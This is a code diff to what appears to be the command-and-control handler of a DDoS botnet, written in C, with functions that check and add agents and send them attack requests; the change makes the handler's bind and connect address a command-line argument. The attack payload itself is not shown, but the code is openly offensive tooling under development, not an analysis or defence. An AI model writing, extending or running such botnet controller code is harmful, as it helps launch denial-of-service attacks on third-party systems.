@@ -10,6 +10,7 @@
 #define TMP_FILE "tmp"
 #define ERROR -1
 
+char *ip_address;
 typedef int (*action_cb_t)(int sock, char *ip, void *data);
 static int for_each_agent(int sock, action_cb_t action_cb,
         void *action_data)
@@ -61,7 +62,7 @@ Error:
 
 static int check_agent(int sock, char *ip, void *data)
 {
-    int rv = ERROR, clt_sock = create_socket(DDOS_HANDL_CLT_PORT, 1000);
+    int rv = ERROR, clt_sock = create_socket(ip_address, DDOS_HANDL_CLT_PORT, 1000);
     int *agents = data;
     ddos_request_t req = {};
     ddos_responce_t resp = {};
@@ -140,7 +141,7 @@ static int add_agent(int sock, char *ip)
 
 static int attack(int sock, char* ip, void *data)
 {
-    int rv = ERROR, clt_sock = create_socket(DDOS_HANDL_CLT_PORT, 1000);
+    int rv = ERROR, clt_sock = create_socket(ip_address, DDOS_HANDL_CLT_PORT, 1000);
     ddos_request_t req = {};
     ddos_responce_t resp = {};
     attack_data_t *attack_data = data; 
@@ -170,7 +171,7 @@ Exit:
     return rv;
 }
 
-int main(void)
+int main(int argc, char *argv[])
 {
     int sock, agents;
     char ip[INET_ADDRSTRLEN];
@@ -178,11 +179,17 @@ int main(void)
     ddos_responce_t resp;
     ddos_cmd_t cmd;
     attack_data_t attack_data = {};
+    if (argc != 2)
+    {
+	fprintf(stderr, "Specify ip address\n");
+	return -1;
+    }
 
-    sock = create_socket(DDOS_HANDL_SRV_PORT, 0);
+    sock = create_socket(argv[1], DDOS_HANDL_SRV_PORT, 0);
     if (sock < 0)
 	return 1;
 
+    ip_address = argv[1];
     while (1)
     {
 	agents = 0;
